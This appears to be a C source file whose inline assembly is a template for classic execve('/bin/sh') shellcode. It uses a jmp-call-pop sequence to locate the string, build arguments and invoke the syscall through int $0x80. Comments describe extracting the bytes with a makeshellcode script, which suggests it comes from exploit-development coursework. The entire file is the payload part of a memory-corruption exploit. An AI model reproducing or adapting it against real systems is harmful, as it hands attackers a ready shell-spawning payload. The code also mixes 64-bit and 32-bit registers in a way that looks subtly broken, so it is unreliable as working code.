int main(void)
//put shellcode instructions in the __asm___() part, then run ./makeshellcode script
//will only take the code up until ret, so be careful if you use ret yourself
{
  __asm__ (
    "jmp j2;"
    "j1: jmp start;"
    "j2: call j1;"
    ".ascii \"/bin/shO\";"
    ".ascii \"AAAA\";"        
    ".ascii \"BBBB\";"
    "nop;"
    "start: pop %rbx;"
    "movl %ebx, 8(%ebx);"
    "xorl %eax, %eax;"
    "movb %al, 7(%ebx);"
    "movl %eax, 12(%ebx);"
    "movb $0xb, %al;"
    "lea 8(%ebx), %ecx;"
    "lea 12(%ebx), %edx;"
    "int $0x80;"
  );
  return 0;
}



